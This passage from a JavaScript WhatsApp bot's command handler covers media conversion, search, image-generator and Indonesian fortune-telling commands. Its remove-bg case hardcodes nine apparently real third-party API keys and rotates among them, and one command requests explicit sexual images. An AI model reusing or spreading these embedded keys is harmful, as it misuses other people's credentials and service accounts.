            if (!text) throw `Example : ${prefix + command} text`
            hm = await fetchJson(api('zenz', '/api/simisimi', { text : text }, 'apikey'))
            m.reply(hm.result.message)
            }
            break
            case 'toimage': case 'toimg': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    hisoka.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            }
            break
	        case 'tomp4': case 'tovideo': {
	        if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
            case 'toaud': case 'toaudio': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
            }
            break
            case 'tomp3': {
            if (!isCreator) return
            if (/document/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            if (!quoted) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            hisoka.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${hisoka.user.name}.mp3`}, { quoted : m })
            }
            break
            case 'tovn': case 'toptt': {
            if (!isCreator) return
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            if (!quoted) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            let media = await quoted.download()
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
            case 'togif': {
            if (!isCreator) return
                if (!quoted) throw 'Reply Image'
                if (!/webp/.test(mime)) throw `balas stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
		let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case 'tourl': {
	        if (!isCreator) return
                m.reply(mess.wait)
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(quoted)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
	    if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await hisoka.downloadAndSaveMediaMessage(quoted, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    hisoka.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case 'yts': case 'ytsearch': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
                    teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ No : ${no++}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Type : ${i.type}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Video ID : ${i.videoId}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${i.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Views : ${i.views}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Duration : ${i.timestamp}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Upload At : ${i.ago}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Author : ${i.author.name}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${i.url}\n\n─────────────────\n\n`
                }
                hisoka.sendMessage(m.chat, { image: { url: search.all[0].thumbnail },  caption: teks }, { quoted: m })
            }
            break
        case 'google': {
        if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = `Google Search From : ${text}\n\n`
                for (let g of res) {
                teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Title* : ${g.title}\n`
                teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Description* : ${g.snippet}\n`
                teks += `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case 'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [
                    {buttonId: `gimage ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: images },
                    caption: `*-------「 GIMAGE SEARCH 」-------*
🤠 *Query* : ${text}
🔗 *Media Url* : ${images}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case 'play': case 'ytplay': {
	    if (!isCreator) return
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: anu.thumbnail },
                    caption: `
╭━═════════════━•
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${anu.title}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ext : Search
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ ID : ${anu.videoId}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Duration : ${anu.timestamp}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Viewers : ${anu.views}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Upload At : ${anu.ago}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Author : ${anu.author.name}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Channel : ${anu.author.url}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Description : ${anu.description}
│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${anu.url}
╰━═════════════━•`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	    case 'ytmp3': case 'ytaudio': {
	    if (!isCreator) return
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendImage(m.chat, media.thumb, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${media.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ File Size : ${media.filesizeF}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${isUrl(text)}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ext : MP3\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'ytmp4': case 'ytvideo': {
            if (!isCreator) return
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${media.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ File Size : ${media.filesizeF}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${isUrl(text)}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ext : MP3\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
	    case 'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendImage(m.chat, media.thumb, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${media.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ File Size : ${media.filesizeF}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${urls[text - 1]}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ext : MP3\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Resolusi : ${args[1] || '128kbps'}`, m)
                hisoka.sendMessage(m.chat, { audio: { url: media.dl_link }, mimetype: 'audio/mpeg', fileName: `${media.title}.mp3` }, { quoted: m })
            }
            break
            case 'getvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
                let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(urls[text - 1], quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${media.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ File Size : ${media.filesizeF}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Url : ${urls[text - 1]}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Ext : MP3\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
            }
            break
            case 'pinterest': {
                m.reply(mess.wait)
		let { pinterest } = require('./lib/scraper')
                anu = await pinterest(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: result }, caption: '│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Media Url : '+result }, { quoted: m })
            }
            break
            case 'anime': case 'waifu': case 'husbu': case 'neko': case 'shinobu': case 'megumin': case 'waifus': case 'nekos': case 'trap': case 'blowjob': {
            if (!isCreator) return
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/api/random/'+command, {}, 'apikey') }, caption: 'Generate Random ' + command }, { quoted: m })
            }
            break
	    case 'couple': {
                m.reply(mess.wait)
                let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
                let random = anu[Math.floor(Math.random() * anu.length)]
                hisoka.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
                hisoka.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
            }
	    break
            case 'coffe': case 'kopi': {
            let buttons = [
                    {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: 'https://coffee.alexflipnote.dev/random' },
                    caption: `☕ Random Coffe`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wallpaper': {
                if (!text) throw 'Masukkan Query Title'
		let { wallpaper } = require('./lib/scraper')
                anu = await wallpaper(text)
                result = anu[Math.floor(Math.random() * anu.length)]
		let buttons = [
                    {buttonId: `wallpaper ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image[0] },
                    caption: `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${result.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Category : ${result.type}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Detail : ${result.source}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Media Url : ${result.image[2] || result.image[1] || result.image[0]}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'wikimedia': {
                if (!text) throw 'Masukkan Query Title'
		let { wikimedia } = require('./lib/scraper')
                anu = await wikimedia(text)
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `wikimedia ${text}`, buttonText: {displayText: 'Next Image'}, type: 1}
                ]
                let buttonMessage = {
                    image: { url: result.image },
                    caption: `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Title : ${result.title}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Source : ${result.source}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ Media Url : ${result.image}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case 'quotesanime': case 'quoteanime': {
		let { quotesAnime } = require('./lib/scraper')
                let anu = await quotesAnime()
                result = anu[Math.floor(Math.random() * anu.length)]
                let buttons = [
                    {buttonId: `quotesanime`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: `~_${result.quotes}_\n\nBy '${result.karakter}', ${result.anime}\n\n- ${result.up_at}`,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
	        case 'motivasi': case 'dilanquote': case 'bucinquote': case 'katasenja': case 'puisi': {
                let anu = await fetchJson(api('zenz', '/api/'+command, {}, 'apikey'))
                let buttons = [
                    {buttonId: `motivasi`, buttonText: {displayText: 'Next'}, type: 1}
                ]
                let buttonMessage = {
                    text: anu.result.message,
                    footer: 'Press The Button Below',
                    buttons: buttons,
                    headerType: 2
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
            case '3dchristmas': case '3ddeepsea': case 'americanflag': case '3dscifi': case '3drainbow': case '3dwaterpipe': case 'halloweenskeleton': case 'sketch': case 'bluecircuit': case 'space': case 'metallic': case 'fiction': case 'greenhorror': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dcrackedstone': case '3dneonlight': case 'impressiveglitch': case 'naturalleaves': case 'fireworksparkle': case 'matrix': case 'dropwater':  case 'harrypotter': case 'foggywindow': case 'neondevils': case 'christmasholiday': case '3dgradient': case 'blackpink': case 'gluetext': {
                if (!text) throw `Example : ${prefix + command} text`
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/textpro/' + command, { text: text }, 'apikey') }, caption: `Text Pro ${command}` }, { quoted: m})
	    }
            break
	    case 'shadow': case 'romantic': case 'smoke': case 'burnpapper': case 'naruto': case 'lovemsg': case 'grassmsg': case 'lovetext': case 'coffecup': case 'butterfly': case 'harrypotter': case 'retrolol': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/photooxy/' + command, { text: text }, 'apikey') }, caption: `Photo Oxy ${command}` }, { quoted: m })
            }
            break
            case 'ffcover': case 'crossfire': case 'galaxy': case 'glass': case 'neon': case 'beach': case 'blackpink': case 'igcertificate': case 'ytcertificate': {
                if (!text) throw 'No Query Text'
                m.reply(mess.wait)
                hisoka.sendMessage(m.chat, { image: { url: api('zenz', '/ephoto/' + command, { text: text }, 'apikey') }, caption: `Ephoto ${command}` }, { quoted: m })
            }
            break
	    case 'nomerhoki': case 'nomorhoki': {
                if (!Number(text)) throw `Example : ${prefix + command} 6288292024190`
                let anu = await primbon.nomer_hoki(Number(text))
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nomor HP :* ${anu.message.nomer_hp}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Angka Shuzi :* ${anu.message.angka_shuzi}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`, m)
            }
            break
            case 'artimimpi': case 'tafsirmimpi': {
                if (!text) throw `Example : ${prefix + command} belanja`
                let anu = await primbon.tafsir_mimpi(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Mimpi :* ${anu.message.mimpi}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Arti :* ${anu.message.arti}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Solusi :* ${anu.message.solusi}`, m)
            }
            break
            case 'ramalanjodoh': case 'ramaljodoh': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalanjodohbali': case 'ramaljodohbali': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'suamiistri': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Suami :* ${anu.message.suami.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Istri :* ${anu.message.istri.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Hasil :* ${anu.message.result}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'ramalancinta': case 'ramalcinta': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005, Novia, 16, 11, 2004`
                let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
                let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Anda :* ${anu.message.nama_anda.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sisi Positif :* ${anu.message.sisi_positif}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Sisi Negatif :* ${anu.message.sisi_negatif}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'artinama': {
                if (!text) throw `Example : ${prefix + command} Dika Ardianta`
                let anu = await primbon.arti_nama(text)
                if (anu.status == false) return m.reply(anu.message)
                hisoka.sendText(m.chat, `│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Nama :* ${anu.message.nama}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Arti :* ${anu.message.arti}\n│⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱𝟬𝟱➳ *Catatan :* ${anu.message.catatan}`, m)
            }
            break
            case 'kecocokannama': case 'cocoknama': {
                if (!text) throw `Example : ${prefix + command} Dika, 7, 7, 2005`
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
